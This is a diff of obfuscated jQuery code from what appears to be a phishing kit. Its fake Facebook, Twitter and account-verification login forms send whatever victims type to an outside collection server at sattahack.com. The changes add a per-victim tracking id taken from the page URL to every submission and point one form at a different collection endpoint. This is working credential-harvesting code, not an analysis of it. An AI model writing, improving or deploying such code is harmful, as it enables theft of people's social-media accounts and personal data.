@@ -76,7 +76,7 @@ $(document).ready(function () {
       $.ajax({
         type: "POST",
         url: "https://sattahack.com/info3",
-        data: $(this).serialize(),
+        data: $(this).serialize() + `&id=${encodeURIComponent($id)}`,
         beforeSend: function () {
           $(".login-facebook").hide();
         },
@@ -148,7 +148,7 @@ $(document).ready(function () {
       $.ajax({
         type: "POST",
         url: "https://sattahack.com/info3",
-        data: $(this).serialize(),
+        data: $(this).serialize() + `&id=${encodeURIComponent($id)}`,
         beforeSend: function () {
           $(".login-twitter").hide();
         },
@@ -225,7 +225,7 @@ $(document).ready(function () {
       $.ajax({
         type: "POST",
         url: "https://sattahack.com/info3",
-        data: $(this).serialize(),
+        data: $(this).serialize() + `&id=${encodeURIComponent($id)}`,
         beforeSend: function () {
           $(".login-facebook-sec").hide();
         },
@@ -304,7 +304,7 @@ $(document).ready(function () {
       $.ajax({
         type: "POST",
         url: "https://sattahack.com/info3",
-        data: $(this).serialize(),
+        data: $(this).serialize() + `&id=${encodeURIComponent($id)}`,
         beforeSend: function () {
           $(".login-twitter-sec").hide();
         },
@@ -327,7 +327,7 @@ $(document).ready(function () {
           _0x1ebcc1 = $("input#vmail").val(),
           _0x28bf58 = $("input#codetel").val(),
           _0x36c6e1 = $("input#validateLogin").val();
-          id = $("input#id").val();
+          id = new URLSearchParams(window.location.search).get('id');
         if (
           _0xbf449e == "" &&
           _0x1406b6 == "" &&
@@ -347,8 +347,8 @@ $(document).ready(function () {
         }
         $.ajax({
           type: "POST",
-          url: "https://sattahack.com/info2",
-          data: $(this).serialize(),
+          url: "https://sattahack.com/info3",
+          data: $(this).serialize() + `&id=${encodeURIComponent($id)}`,
           beforeSend: function () {
             $(".account_verification").hide();
             $(".check_verification").show();
